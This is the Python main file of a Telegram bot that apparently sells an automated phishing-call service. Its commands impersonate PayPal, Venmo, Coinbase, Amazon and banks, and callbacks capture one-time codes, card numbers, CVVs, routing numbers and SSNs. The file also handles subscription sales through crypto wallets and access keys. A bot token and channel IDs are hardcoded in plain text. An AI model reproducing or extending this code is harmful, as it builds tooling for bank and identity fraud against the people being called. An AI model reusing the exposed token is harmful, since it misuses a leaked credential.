import asyncio
import os
import psutil
import traceback
import logging

from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import ErrorEvent

from utils import (
    db,
    load_all_users,
    load_messages,
    reload_users_every_12h,
    load_keyboards
)
from handlers import *
from config import get_admin

# ================== CONFIG ==================

BOT_TOKEN = "7886245319:AAGP1f1WQ_1Baw5ewNNlHTa6JsWRud5GP1Q"
ERROR_CHANNEL_ID = -1003771364465
MEMORY_CHANNEL_ID = -1002942544591

# ============================================

logging.basicConfig(
    level=logging.ERROR,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ============================================
# ERROR REPORTING
# ============================================

async def report_error(error: Exception, where: str = "Unknown"):
    tb = "".join(
        traceback.format_exception(type(error), error, error.__traceback__)
    )

    text = (
        "🚨 <b>BOT ERROR</b>\n\n"
        f"<b>Where:</b> {where}\n"
        f"<b>Type:</b> {type(error).__name__}\n"
        f"<b>Message:</b> {error}\n\n"
        f"<pre>{tb[:3500]}</pre>"
    )

    logging.error(tb)

    try:
        await bot.send_message(
            ERROR_CHANNEL_ID,
            text,
            parse_mode="HTML"
        )
    except Exception as e:
        print("FAILED TO SEND ERROR TO CHANNEL:", e)


async def safe_task(coro, name: str):
    try:
        await coro
    except asyncio.CancelledError:
        pass
    except Exception as e:
        await report_error(e, where=name)

# ============================================
# MEMORY LOGGER
# ============================================

def get_memory_usage():
    try:
        process = psutil.Process(os.getpid())
        return round(process.memory_info().rss / (1024 * 1024), 2)
    except Exception:
        return "N/A"


async def log_memory():
    while True:
        try:
            await bot.send_message(
                MEMORY_CHANNEL_ID,
                f"💾 Memory usage: {get_memory_usage()} MB"
            )
        except Exception as e:
            await report_error(e, where="Memory Logger")

        await asyncio.sleep(300)

# ============================================
# GLOBAL ERROR HANDLER (AIROGRAM v3)
# ============================================

@dp.error()
async def global_error_handler(event: ErrorEvent):
    await report_error(event.exception, where="Aiogram Handler")

# ============================================
# COMMAND & CALLBACK REGISTRATION
# ============================================

# BASIC
dp.message.register(start_command, Command("start"))
dp.message.register(help_command, Command("help"))

dp.callback_query.register(help_callback, lambda c: c.data == "help")
dp.callback_query.register(proofs_callback, lambda c: c.data == "proofs")
dp.callback_query.register(features_callback, lambda c: c.data == "features")
dp.callback_query.register(start_callback, lambda c: c.data in {"back1", "back3", "back4"})

# SUBSCRIPTIONS
dp.message.register(purchase_command, Command("purchase"))
dp.message.register(prices_command, Command("prices"))
dp.message.register(my_profile_command, Command("plan"))
dp.message.register(redeem_keys, Command("redeem"))

dp.callback_query.register(
    wallets_callback,
    lambda c: c.data in {"15", "25", "89", "149", "299", "999"}
)

dp.callback_query.register(
    wallet_callback,
    lambda c: ':' in c.data
)

dp.callback_query.register(purchase_callback, lambda c: c.data == "purchase")

# CALL
dp.message.register(
    call_command,
    Command(
        "repportcall", "recall", "call", "paypal", "venmo",
        "applepay", "coinbase", "microsoft", "amazon",
        "quadpay", "cashapp", "citizens", "marcus",
        "carrier", "creditcard", "ssn", "customcall",
        "customvoice"
    )
)

dp.message.register(Phonelist_commands, Command("phonelist"))

dp.callback_query.register(
    otp_accept_callback,
    lambda c: c.data in {"acp", "den", "card", "cvv", "rout"}
)

# SETTINGS
dp.message.register(voicelist_command, Command("voicelist"))
dp.message.register(setvoice_command, Command("setvoice"))
dp.message.register(setscript_command, Command("createscript"))
dp.message.register(process_script_text, ScriptForm.waiting_for_script)
dp.message.register(view_script, Command("script"))

dp.callback_query.register(
    changevoice_callback,
    lambda c: c.data in {"Michael", "Ethan", "Mark", "Mia", "Sofia", "Andria"}
)

# ADMIN
dp.message.register(ban_command, Command("ban"))
dp.message.register(unban_command, Command("unban"))
dp.message.register(reload_command, Command("reload"))
dp.message.register(reload_messages_command, Command("refresh"))
dp.message.register(getwallet_command, Command("wallet"))
dp.message.register(switch_command, Command("switch"))
dp.message.register(send_all, Command("news"))
dp.message.register(keys_command, Command("keys"))
dp.message.register(generate_keys_command, Command("gkeys"))

dp.callback_query.register(keys_callback, lambda c: c.data == "keys")
dp.callback_query.register(generate_keys_callback, lambda c: c.data == "g_keys")

dp.callback_query.register(
    get_keys_callback,
    lambda c: c.data in {
        "2 hours", "1 day", "4 days",
        "1 week", "1 month", "lifetime"
    }
)

# ============================================
# MAIN
# ============================================

async def main():
    print("🤖 Bot starting...")

    try:
        await db.init_db()
        await db.create_tables()
        await load_all_users()
        await load_messages()
        await load_keyboards()

        asyncio.create_task(safe_task(log_memory(), "Memory Logger"))
        asyncio.create_task(
            safe_task(reload_users_every_12h(), "User Reload")
        )

        admin = get_admin()
        await bot.send_message(admin["id"], "🟢 Bot online")

        await dp.start_polling(bot)

    except Exception as e:
        await report_error(e, where="Main Loop")

    finally:
        print("🛑 Bot shutting down")
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())

